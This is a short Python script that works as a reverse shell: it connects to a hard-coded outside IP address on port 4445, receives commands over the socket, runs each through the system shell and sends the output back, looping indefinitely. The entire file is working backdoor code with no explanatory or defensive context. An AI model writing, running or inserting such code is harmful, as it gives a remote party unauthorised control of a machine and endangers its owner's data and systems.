 

import subprocess
import socket
import os
import time

def execute_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('194.87.239.60', 4445))

while True:
    command = connection.recv(1024)
    try:
        command_result = execute_command(command)

        connection.send(command_result)
    except Exception as e:
        print('.')

connection.close()

